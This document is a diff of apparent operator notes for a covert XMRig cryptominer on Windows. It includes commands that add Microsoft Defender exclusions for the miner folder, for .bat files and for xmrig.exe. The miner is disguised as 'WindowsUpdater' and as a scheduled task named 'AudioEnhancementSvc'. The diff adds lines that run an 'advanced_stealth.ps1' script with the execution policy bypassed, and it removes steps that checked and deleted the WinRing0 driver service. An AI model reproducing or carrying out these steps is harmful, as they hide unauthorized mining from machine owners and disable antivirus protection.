@@ -1,7 +1,4 @@
-Verify MSR:
-sc query WinRing0_1_2_0
 
- 
 delete log file:
 del "%TEMP%\xmrig_watchdog.lock"
 
@@ -9,44 +6,16 @@ del "%TEMP%\xmrig_watchdog.lock"
 to check:
 schtasks /query /tn AudioEnhancementSvc /fo LIST /v
 
-
-check miner log:
-type "%ProgramData%\WindowsUpdater\miner.log" | find "MSR"
-
-
-
-Step 1: Delete the Existing Service:
-
-=> Stop the service if running
-sc stop WinRing0_1_2_0
-
-=> Delete the service
-sc delete WinRing0_1_2_0
-
-=> Force remove leftover registry entries
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinRing0_1_2_0" /f
-
-If the service name has spaces (like WinRing0_1 2_0), use quotes:
-
-sc stop "WinRing0_1 2_0"
-sc delete "WinRing0_1 2_0"
-reg delete "HKLM\SYSTEM\CurrentControlSet\Services\WinRing0_1 2_0" /f
-
+powershell -ExecutionPolicy Bypass -File "advanced_stealth.ps1" -Install
+powershell -ExecutionPolicy Bypass -File "advanced_stealth.ps1" -Monitor
 
 
 add anitvirus exceptins:
 
 powershell -Command "Add-MpPreference -ExclusionPath 'C:\ProgramData\WindowsUpdater'"
 powershell -Command "Add-MpPreference -ExclusionPath '%CD%\miner_src'"
-
-
-alternate(antiviruss exceptions):
-
-# Add folder exclusions
 Add-MpPreference -ExclusionPath "C:\ProgramData\WindowsUpdater"
 Add-MpPreference -ExclusionPath "$((Get-Location).Path)\miner_src"
-
-# Add file exclusions
 Add-MpPreference -ExclusionExtension ".bat"
 Add-MpPreference -ExclusionProcess "xmrig.exe"
 
